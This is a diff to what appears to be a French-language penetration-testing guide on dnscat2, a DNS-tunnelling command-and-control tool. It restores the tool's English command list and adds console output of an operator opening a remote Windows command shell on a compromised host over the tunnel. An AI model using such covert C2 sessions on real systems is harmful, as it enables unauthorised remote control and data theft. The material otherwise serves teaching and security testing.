@@ -114,18 +114,18 @@ Liste des options dnscat2
 ```
 dnscat2> ?
 
-Voici une liste de commandes (utilisez -h sur l'une d'entre elles pour une aide supplémentaire) :
-* écho
-* aider
-* tuer
-* arrêter
-* ensemble
-* commencer
-* arrêt
+Here is a list of commands (use -h on any of them for additional help):
+* echo
+* help
+* kill
+* quit
+* set
+* start
+* stop
 * tunnels
-* non défini
-* fenêtre
-* les fenêtres
+* unset
+* window
+* windows
 
 ```
 
@@ -135,4 +135,24 @@ Nous pouvons utiliser dnscat2 pour interagir avec les sessions et aller plus loi
 
 Interagir avec la session établie
 
-``
+```
+dnscat2> window -i 1
+New window created: 1
+history_size (session) => 1000
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+This is a console session!
+
+That means that anything you type will be sent as-is to the
+client, and anything they type will be displayed as-is on the
+screen! If the client is executing a command and you don't
+see a prompt, try typing 'pwd' or something!
+
+To go back, type ctrl-z.
+
+Microsoft Windows [Version 10.0.18363.1801]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+exec (OFFICEMANAGER) 1>
+```
